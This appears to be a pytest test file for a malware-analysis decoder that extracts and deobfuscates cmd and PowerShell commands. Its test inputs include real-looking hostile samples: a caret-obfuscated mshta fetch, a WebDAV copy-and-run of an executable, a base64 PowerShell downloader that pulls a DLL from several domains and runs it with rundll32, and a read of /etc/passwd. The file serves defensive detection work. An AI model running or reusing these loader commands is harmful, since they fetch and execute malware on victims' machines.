import pytest
import regex as re
from multidecoder.decoders.shell import (
    CMD_RE,
    find_cmd_strings,
    find_powershell_strings,
    get_cmd_command,
    get_powershell_command,
    strip_carets,
)
from multidecoder.node import Node

test = b"SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)"


# CMD_RE
@pytest.mark.parametrize(
    "data",
    [
        b"",
        b"CmDF",
    ],
)
def test_cmd_re_not_match(data: bytes):
    assert not re.search(CMD_RE, data)


@pytest.mark.parametrize(
    "data",
    [
        b"cmd arguments",
        b"CmD ArgUmenTs",
        b"c^m^d c^omman^d",
        b'cmd /c ""echo bee""',
    ],
)
def test_cmd_re_match(data: bytes):
    assert re.match(CMD_RE, data)


def test_cmd_re_null():
    match = re.match(CMD_RE, b"cmd.exe\x00somethingelse")
    assert match
    assert match.span() == (0, 7)


def test_cmd_re_ex1():
    match = re.search(CMD_RE, test)
    assert match
    assert test[match.start() : match.end()] == b"cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html"


# strip_carets
@pytest.mark.parametrize(
    ("data", "expected"),
    [
        (b"", b""),
        (b"test", b"test"),
        (b"^", b""),
        (b"^^", b"^"),
        (b"test^", b"test"),
        (b'"^"', b'"^"'),
        (b"start^\r\nend", b"startend"),
        (b'"test"" ^', b'"test"" ^'),
    ],
)
def test_strip_carets(data: bytes, expected: bytes):
    assert strip_carets(data) == expected


# find_cmd_strings
def test_find_cmd_strings():
    assert find_cmd_strings(test) == [
        Node(
            type_="shell.cmd",
            value=b"cmd /c mshta http://some.url/x.html",
            start=13,
            end=55,
            obfuscation="unescape.shell.carets",
        )
    ]


def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
    ex = b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd"
    assert find_cmd_strings(ex) == [
        Node(
            type_="shell.cmd",
            value=b"cmd /c curl https://abc.org && powershell -Command cat /etc/passwd",
            start=37,
            end=103,
        )
    ]


# From c8004f944055296f2636a64f8a469b9db6c9e983305f83ddc50c0617950d2271
def test_find_cmd_strings_with_dynamic_cmd():
    ex = b'"C:\\WINDOWS\\system32\\cmd.exe" /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv /user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe  & net use * /d /y"'
    assert find_cmd_strings(ex) == [
        Node(
            type_="shell.cmd",
            value=b'cmd.exe /c "net use Q: https://webdav.4shared.com dE}9tBDaFK\'Y%%uv /user:lasex69621@cohodl.com & type \\\\webdav.4shared.com@SSL\\aa\\3.exe > 3.exe & forfiles /p c:\\windows\\system32 /m notepad.exe /c %%cd%%/3.exe & net use * /d /y"',
            start=21,
            end=250,
        )
    ]


# find_powershell_strings
def test_find_powershell_strings_enc():
    ex = b"powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=="
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.cmd",
            value=b"powershell /e ZQBjAGgAbwAgAGIAZQBlAA==",
            obfuscation="unescape.shell.carets",
            start=0,
            end=len(ex),
            children=[
                Node(
                    "shell.powershell",
                    b"powershell -Command echo bee",
                    "powershell.base64",
                    0,
                    28,
                )
            ],
        )
    ]


def test_find_powershell_strings_enc_with_quotes():
    ex = b'powershell /e "ZQBjAGgAbwAgAGIAZQBlAA=="'
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"powershell -Command echo bee",
            obfuscation="powershell.base64",
            start=0,
            end=len(ex),
        )
    ]


def test_find_powershell_for_loop():
    ex = (
        b'for /f "tokens=*" %%a in (\'powershell -Command "hostname '
        b"| %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
    )
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
            obfuscation="",
            start=27,
            end=96,
        )
    ]


def test_find_powershell_strings_invoke_expression():
    ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1",
            obfuscation="",
            start=19,
            end=len(ex) - 1,
        )
    ]


def test_find_powershell_strings_from_dynamic_command():
    ex = b'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -encodedcommand "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUABvAGwAeQBuAG8AbQBpAGEAbABpAHMAdABBAG4AZwBsAGkAYwBpAHoAZQBzACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AZQBkAHMAZQBuAGUAegBhAGwAdQBtAGkAbgB1AG0ALgBjAG8AbQAvAE8AUABHAC8ANABhAFQAOAB2AHcALABoAHQAdABwAHMAOgAvAC8AeQBlAGwAbABvAHcAaABhAHQAZwBsAG8AYgBhAGwALgBjAG8AbQAvAEcAMQBSAFcALwBpAGsAdgBvAHEAbQBpADcASgBzAGwALABoAHQAdABwAHMAOgAvAC8AYQB3AGEAaQBzAGQAYQBuAGkAcwBoAC4AYwBvAG0ALwBOAG4AUgBVAC8AaABwAHQAUwBKAHYALABoAHQAdABwAHMAOgAvAC8AYQB2AGEAaQBsAGEAYgBsAGUAYwBsAGUAYQBuAGUAcgAuAGMAbwBtAC8AdwBoAGcAaQBvAC8ASgBmAHEAeABiAFoAdwBQADEAWQBEACwAaAB0AHQAcABzADoALwAvAGUAbgBnAHYAaQBkAGEALgBjAG8AbQAuAGIAcgAvAHIATABtAC8AYwBmAEsAeQBIAEoAeQB2AGgAMgAsAGgAdAB0AHAAcwA6AC8ALwB1AGIAbQBoAGEAaQB0AGkALgBvAHIAZwAvAHQAaABRADYATAAvAG8ARgBMAE8AZQBqAEoAcgBHACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHQAYQB1AHQAbwBsAG8AZwBpAHoAZQBkACAAaQBuACAAJABQAG8AbAB5AG4AbwBtAGkAYQBsAGkAcwB0AEEAbgBnAGwAaQBjAGkAegBlAHMAKQAgAHsAdAByAHkAIAB7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdABhAHUAdABvAGwAbwBnAGkAegBlAGQAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAIAAxADgAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAuAGQAbABsACkALgBsAGUAbgBnAHQAaAAgAC0AZwBlACAAMQAwADAAMAAwADAAKQAgAHsAcwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwALABHAEwANwAwADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7AH0AfQA="'

    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b'powershell.exe -Command Start-Sleep -Seconds 4;$PolynomialistAnglicizes = ("https://edsenezaluminum.com/OPG/4aT8vw,https://yellowhatglobal.com/G1RW/ikvoqmi7Jsl,https://awaisdanish.com/NnRU/hptSJv,https://availablecleaner.com/whgio/JfqxbZwP1YD,https://engvida.com.br/rLm/cfKyHJyvh2,https://ubmhaiti.org/thQ6L/oFLOejJrG").split(",");foreach ($tautologized in $PolynomialistAnglicizes) {try {Invoke-WebRequest $tautologized -TimeoutSec 18 -O $env:TEMP\\manipulation.dll;if ((Get-Item $env:TEMP\\manipulation.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\manipulation.dll,GL70;break;}}catch {Start-Sleep -Seconds 4;}}',
            obfuscation="powershell.base64",
            start=44,
            end=1658,
        ),
    ]


def test_find_powershell_strings_with_combo_of_ps1_and_cmd():
    ex = b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd"
    assert find_powershell_strings(ex) == [
        Node(
            type_="shell.powershell",
            value=b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd",
            start=0,
            end=103,
        ),
        Node(
            type_="shell.powershell",
            value=b"powershell -Command cat /etc/passwd",
            start=68,
            end=35,
        ),
    ]


# get_cmd_command
def test_get_cmd_command_empty():
    assert get_cmd_command(b"") == b""


def test_get_cmd_command_c():
    assert get_cmd_command(b"cmd/ccommand") == b"command"
    assert get_cmd_command(b"cmd.exe/ccommand") == b"command"


def test_get_cmd_command_k():
    assert get_cmd_command(b"cmd/kcommand") == b"command"
    assert get_cmd_command(b"cmd.exe/kcommand") == b"command"


def test_get_cmd_command_r():
    assert get_cmd_command(b"cmd/rcommand") == b"command"
    assert get_cmd_command(b"cmd.exe/rcommand") == b"command"


def test_get_cmd_command_amp():
    assert get_cmd_command(b"cmd&command&command2&command3") == b"command&command2&command3"


def test_get_cmd_command_upper():
    assert get_cmd_command(b"CMD/CCOMMAND") == b"COMMAND"
    assert get_cmd_command(b"CMD/KCOMMAND") == b"COMMAND"


def test_get_cmd_command_nested():
    assert get_cmd_command(b"cmd /c cmd /c command") == b"cmd /c command"
    assert get_cmd_command(b"cmd /c cmd /k command") == b"cmd /k command"
    assert get_cmd_command(b"cmd /k cmd /c command") == b"cmd /c command"
    assert get_cmd_command(b"cmd /k cmd /k command") == b"cmd /k command"


def test_get_cmd_command_strip_quotes():
    assert get_cmd_command(b'cmd /c   "command"') == b"command"


def test_get_cmd_command_last_quote_only():
    assert get_cmd_command(b'cmd /c "comm"an"d') == b'comm"and'


def test_get_cmd_command_strip_only_if_first_quote():
    assert get_cmd_command(b'cmd /c command"') == b'command"'


# get_powershell_command
def test_get_powershell_command_empty():
    assert get_powershell_command(b"") == b""


def test_get_powershell_command_bare():
    assert get_powershell_command(b"powershell command") == b"command"
    assert get_powershell_command(b"pwsh command") == b"command"


def test_get_powershell_command_exe():
    assert get_powershell_command(b"powershell.exe command") == b"command"
    assert get_powershell_command(b"pwsh.exe command") == b"command"


def test_get_powershell_command_args():
    assert get_powershell_command(b"powershell -arg1 -arg2 command") == b"command"
